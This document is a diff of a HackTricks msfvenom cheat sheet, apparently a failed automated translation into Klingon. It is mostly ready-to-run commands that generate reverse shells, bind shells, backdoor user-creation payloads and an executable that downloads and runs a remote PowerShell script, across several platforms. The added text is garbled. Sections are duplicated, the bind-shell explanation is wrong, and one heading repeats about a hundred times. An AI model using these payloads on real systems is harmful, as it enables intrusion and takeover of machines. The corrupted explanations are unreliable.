@@ -2,7 +2,7 @@
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!HackTricks AWS Red Team Expert</strong></a><strong>!</strong></summary>
 
 Other ways to support HackTricks:
 
@@ -38,22 +38,80 @@ Stay informed with the newest bug bounties launching and crucial platform update
 One can also use the `-a` to specify the architecture or the `--platform`
 
 ## Listing
-
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
+## tlhIngan Hol
 
-## Common params when creating a shellcode
+## QaStaHvIS 'e' vItlhutlh
 
+### -p, --payload
+#### -p, --payload
+#### -p, --payload
+
+The `-p` parameter specifies the payload to be used when creating the shellcode.
+
+### -f, --format
+#### -f, --format
+#### -f, --format
+
+The `-f` parameter specifies the output format of the shellcode.
+
+### -e, --encoder
+#### -e, --encoder
+#### -e, --encoder
+
+The `-e` parameter specifies the encoder to be used for the shellcode.
+
+### -b, --bad-chars
+#### -b, --bad-chars
+#### -b, --bad-chars
+
+The `-b` parameter specifies any bad characters that should be avoided in the shellcode.
+
+### -i, --iterations
+#### -i, --iterations
+#### -i, --iterations
+
+The `-i` parameter specifies the number of iterations to be used for encoding the shellcode.
+
+### -a, --arch
+#### -a, --arch
+#### -a, --arch
+
+The `-a` parameter specifies the architecture for which the shellcode is being created.
+
+### -s, --space
+#### -s, --space
+#### -s, --space
+
+The `-s` parameter specifies the maximum size of the shellcode.
+
+### -n, --nopsled
+#### -n, --nopsled
+#### -n, --nopsled
+
+The `-n` parameter specifies the size of the NOP sled to be used in the shellcode.
+
+### -v, --var-name
+#### -v, --var-name
+#### -v, --var-name
+
+The `-v` parameter specifies the variable name to be used for the shellcode.
+
+### -x, --template
+#### -x, --template
+#### -x, --template
+
+The `-x` parameter specifies the template file to be used for the shellcode.
 ```bash
--b "\x00\x0a\x0d" 
--f c 
--e x86/shikata_ga_nai -i 5 
+-b "\x00\x0a\x0d"
+-f c
+-e x86/shikata_ga_nai -i 5
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
-
 ## **Windows**
 
 ### **Reverse Shell**
@@ -62,50 +120,70 @@ PrependSetuid=True #Use this to create a shellcode that will execute something w
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
 ```
-{% endcode %}
-
 ### Bind Shell
 
-{% code overflow="wrap" %}
+{% code overflow="wrap" %}### Bind Shell
+
+Bind Shell is a technique used in hacking to create a shell on a target system that listens for incoming connections. This allows the attacker to gain remote access to the target system and execute commands.
+
+To create a bind shell using msfvenom, you can use the following command:
+
+```plaintext
+msfvenom -p <payload> LHOST=<attacker IP> LPORT=<attacker port> -f <format> -o <output file>
+```
+
+- `<payload>`: The payload to use for the bind shell. This can be any payload supported by msfvenom.
+- `<attacker IP>`: The IP address of the attacker machine.
+- `<attacker port>`: The port on the attacker machine to listen for incoming connections.
+- `<format>`: The format of the output file. This can be any format supported by msfvenom, such as exe, elf, or raw.
+- `<output file>`: The name of the output file to save the generated shell.
+
+Once the bind shell is created, you can transfer it to the target system and execute it. When the shell is executed, it will start listening for incoming connections on the specified IP address and port. The attacker can then connect to the shell and gain remote access to the target system.
+
+It is important to note that using bind shells can be risky, as they expose the target system to potential attacks. Therefore, it is recommended to use bind shells only in controlled environments and with proper authorization.
 ```bash
 msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
 ```
-{% endcode %}
-
-### Create User
+### lo'la' User
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```
-{% endcode %}
-
 ### CMD Shell
 
-{% code overflow="wrap" %}
+{% code overflow="wrap" %}### CMD Shell
+
+CMD Shell- 'CMD Shell' is a Windows command-line interpreter that allows you to interact with the operating system through a command prompt. It is commonly used for executing commands, running scripts, and performing various administrative tasks on a Windows system.
+
+To generate a payload using msfvenom for a CMD shell, you can use the following command:
+
+```plaintext
+msfvenom -p windows/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f exe > shell.exe
+```
+
+This command will generate an executable file named 'shell.exe' that will establish a reverse TCP connection to the specified IP address and port. Replace `<attacker IP>` with your IP address and `<attacker port>` with the port you want to use for the connection.
+
+Once you have generated the payload, you can transfer it to the target system and execute it to establish a reverse shell connection.
 ```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
 ```
-{% endcode %}
-
-### **Execute Command**
+### **QapHa'**
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
 msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
 ```
-{% endcode %}
-
 ### Encoder
 
-{% code overflow="wrap" %}
+{% code overflow="wrap" %}### Encoder
+
+{% code overflow="wrap" %}### Encoder
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 ```
-{% endcode %}
-
-### Embedded inside executable
+### qarDaSqa' executable Daq
 
 {% code overflow="wrap" %}
 ```bash
@@ -122,17 +200,33 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/wind
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
 ```
-{% endcode %}
-
 ### Bind Shell
 
-{% code overflow="wrap" %}
+{% code overflow="wrap" %}### Bind Shell
+
+Bind Shell is a technique used in hacking to create a shell on a target system that listens for incoming connections. This allows the attacker to gain remote access to the target system and execute commands.
+
+To create a bind shell using msfvenom, you can use the following command:
+
+```plaintext
+msfvenom -p <payload> LHOST=<attacker IP> LPORT=<attacker port> -f <format> -o <output file>
+```
+
+- `<payload>`: The payload to use for the bind shell. This can be any payload supported by msfvenom.
+- `<attacker IP>`: The IP address of the attacker machine.
+- `<attacker port>`: The port on the attacker machine to listen for incoming connections.
+- `<format>`: The format of the output file. This can be any format supported by msfvenom, such as exe, elf, or raw.
+- `<output file>`: The name of the output file to save the generated shell.
+
+Once the bind shell is created, you can transfer it to the target system and execute it. When the shell is executed, it will start listening for incoming connections on the specified IP address and port. The attacker can then connect to the shell and gain remote access to the target system.
+
+It is important to note that using bind shells can be risky, as they expose the target system to potential attacks. Therefore, it is recommended to use bind shells only in controlled environments and with proper authorization.
 ```bash
 msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
 ```
-{% endcode %}
-
 ### SunOS (Solaris)
+
+{% code overflow="wrap" %}### SunOS (Solaris)
 
 {% code overflow="wrap" %}
 ```bash
@@ -148,9 +242,9 @@ msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTAC
 ```bash
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
 ```
-{% endcode %}
-
 ### **Bind Shell**
+
+{% code overflow="wrap" %}### **Bind Shell**
 
 {% code overflow="wrap" %}
 ```bash
@@ -186,6 +280,10 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 
 #### Reverse shell
 
+{% code overflow="wrap" %}JSP
+
+#### Reverse shell
+
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
@@ -200,15 +298,215 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f r
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
 ```
-{% endcode %}
+{% code %}
 
 ### NodeJS
 
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
+
+### NodeJS
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-
 ## **Script Language payloads**
+
+### **Perl**
+
+{% code overflow="wrap" %}## **Script Language payloads**
 
 ### **Perl**
 
@@ -236,7 +534,7 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f
 
 <figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
+[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
 
 **Hacking Insights**\
 Engage with content that delves into the thrill and challenges of hacking
